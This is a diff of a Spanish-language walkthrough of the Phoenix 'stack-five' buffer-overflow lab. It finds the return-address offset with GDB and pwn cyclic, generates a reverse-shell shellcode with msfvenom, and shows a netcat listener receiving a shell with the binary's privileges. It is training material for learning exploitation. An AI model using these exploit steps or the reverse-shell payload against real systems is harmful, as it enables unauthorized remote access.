@@ -14,13 +14,19 @@ tags: [PWN, Linux, Hacking, Easy]
 
 ![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)
 
-A diferencia de ejecutar una función existente en el binario, esta vez introduciremos el concepto de "código shell", y seremos capaces de ejecutar nuestro propio código.
+
+En este nivel de Phoenix vamos un paso más allá: en lugar de ejecutar solo funciones existentes del binario, introduciremos el concepto de **shellcode**, permitiéndonos ejecutar nuestro propio código directamente en memoria.
+
+
 
 **Consejos:**
 
-- No sientas que tienes que escribir tu propio shellcode todavía - hay un montón en Internet.
-- Si deseas depurar tu shellcode, asegúrate de utilizar la instrucción breakpoint. En i386 / x86_64, es 0xcc, y causará un SIGTRAP.
-- Asegúrate de eliminar esos puntos de interrupción cuando hayas terminado.
+- No es necesario escribir tu propio shellcode desde cero; hay múltiples ejemplos disponibles en Internet.
+- Si deseas depurar tu shellcode, puedes usar la instrucción `breakpoint`. En arquitecturas i386 / x86_64, el byte `0xcc` genera un SIGTRAP.
+- Recuerda eliminar los breakpoints antes de la ejecución final para evitar interrupciones.
+
+
+
 
 ```csharp
 /*
@@ -60,7 +66,9 @@ int main(int argc, char **argv) {
 }
 ```
 
-Lo primero que vamos a hacer es encontrar el offset de este binario, como ya sabemos debemos realizar un buffer, para esto vamos a utilizar la herramienta gdb y vemos las funciones con las que cuenta el main y start_level
+**Analizar funciones del binario**
+
+Primero, identificamos las funciones del binario y sus direcciones usando GDB:
 
 ```csharp
 user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q stack-five
@@ -89,7 +97,10 @@ Non-debugging symbols:
 gef➤  
 ```
 
-Analizamos la función `start_level` en GDB con:
+**Desensamblar start_level**
+
+Esto nos permite ver cómo se maneja el buffer vulnerable:
+
 
 ```csharp
 gef➤  disass start_level
@@ -106,14 +117,14 @@ Dump of assembler code for function start_level:
 End of assembler dump.
 ```
 
-ahora vamos a realizar un break despues de que tome el gets 
+vamos a detener la ejecución justo después de que se lea la entrada: dando un break en la linea `0x00000000004005a1 <+20>:	nop`
 
 ```csharp
 gef➤  b *0x00000000004005a1
 Breakpoint 1 at 0x4005a1
 ```
 
-ahora ejecutamos el binario con el comando `run < <(python -c 'print "A"*64')`
+Ahora ejecutamos el binario con el comando `run < <(python -c 'print "A"*64')` enviando 64 A como payload 
 
 ```csharp
 gef➤  run < <(python -c 'print "A"*64')
@@ -170,7 +181,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤ 
 ```
 
-ahora vamos a imprimir la dirección del buffer con el comando `print $rbp-0x80`
+Imprimir la dirección del buffer con el comando `print $rbp-0x80`
 
 ```csharp
 gef➤  print $rbp-0x80
@@ -203,7 +214,7 @@ gef➤  find 0x7fffffffe5a0, +200, 0x4005c7
 gef➤ 
 ```
 
-ahora lo que debemos hacer es una resta para saber el valor total del offset con el comando `printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0` y así tenemos el dato para el offset
+Debemos hacer es una resta para saber el valor total del offset con el comando `printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0` y así tenemos el dato para el offset
 
 ```csharp
 gef➤  printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0
@@ -211,7 +222,7 @@ gef➤  printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0
 gef➤
 ```
 
-también podemos tener el offset con la herramienta pwn cyclic de la librería Pwntools, vamos a realizar este proceso desde el principio para que nos quede más claro, lo primero es correr el binario con gdb y poner el break para realizar la validación 
+También podemos tener el offset con la herramienta pwn cyclic de la librería Pwntools, vamos a realizar este proceso desde el principio para que nos quede más claro, lo primero es correr el binario con gdb y poner el break para realizar la validación 
 
 ```csharp
 user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q stack-five
@@ -236,7 +247,7 @@ Breakpoint 1 at 0x4005a1
 gef➤
 ```
 
-Luego con el comando r ejecutamos el binario y este nos pide el dato 
+Luego con el comando `r` ejecutamos el binario y este nos pide el dato 
 
 ```csharp
 gef➤  r
@@ -253,7 +264,7 @@ Generamos un **patrón único** con `pwn cyclic` (Pwntools) para provocar un cra
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 ```
 
-y este patrón es el que le enviamos al binario 
+Y este patrón es el que le enviamos al binario 
 
 ```csharp
 gef➤  r
@@ -310,7 +321,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤
 ```
 
-ahora con el comando `info frame` vamos a ver la información del saved rip y vemos que ya pisamos este valor en este caso el valor quedó en saved rip = 0x6261616b6261616a
+ahora con el comando `info frame` vamos a ver la información del saved rip y vemos que ya pisamos este valor en este caso el valor quedó en saved rip es `0x6261616b6261616a`
 
 ```csharp
 gef➤  info frame
@@ -351,7 +362,7 @@ Direcciones (más altas)
 Direcciones (más bajas)
 ```
 
-Ahora que ya tenemos el offset vamos a generar un shellcode con el comando `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name shellcode` para tener una reverse shell en la máquina 
+Ya tenemos el offset vamos a generar un shellcode con el comando `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name shellcode` para tener una reverse shell en la máquina 
 
 ```csharp
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/5_stack-five]
@@ -411,14 +422,14 @@ import sys
 sys.stdout.buffer.write(payload)
 ```
 
-ahora lo que necesimos hacer para ver si el exploit funciona es ejecutarlo con el binario, pero antes debemos tener dentro de la máquina una terminal a la escucha 
+Lo que necesimos hacer para ver si el exploit funciona es ejecutarlo con el binario, pero antes debemos tener dentro de la máquina una terminal a la escucha, esto se hace con el comando `nc -nlvp 4444`
 
 ```csharp
 user@phoenix-amd64:~$ nc -nlvp 4444
 Listening on [0.0.0.0] (family 0, port 4444)
 ```
 
-Una vez estamos a la escucha, vamos a ejecutar el exploit y si todo sale bien, tendremos una shell reversa, al ejecutarlo se queda de esta manera 
+Una vez estamos a la escucha, vamos a ejecutar el exploit y si todo sale bien, tendremos una shell reversa. Al ejecutarlo se queda de esta manera 
 
 ```csharp
 user@phoenix-amd64:/tmp$ python3 Local_exploit.py | /opt/phoenix/amd64/stack-five 
@@ -436,3 +447,15 @@ id
 uid=1000(user) gid=1000(user) euid=405(phoenix-amd64-stack-five) egid=405(phoenix-amd64-stack-five) groups=405(phoenix-amd64-stack-five),27(sudo),1000(user)
 
 ```
+
+**Conclusión**
+
+En Stack Five aprendimos a ejecutar nuestro propio código en memoria mediante un shellcode, y no solo a redirigir el flujo hacia funciones existentes.
+
+Puntos clave:
+
+Funciones inseguras como gets() permiten sobrescribir el saved RIP y ejecutar código arbitrario.
+
+El offset desde el inicio del buffer hasta la dirección de retorno es crítico para controlar la ejecución.
+
+La combinación de shellcode y gadgets (jmp rax) permite obtener una reverse shell, completando el reto con éxito.
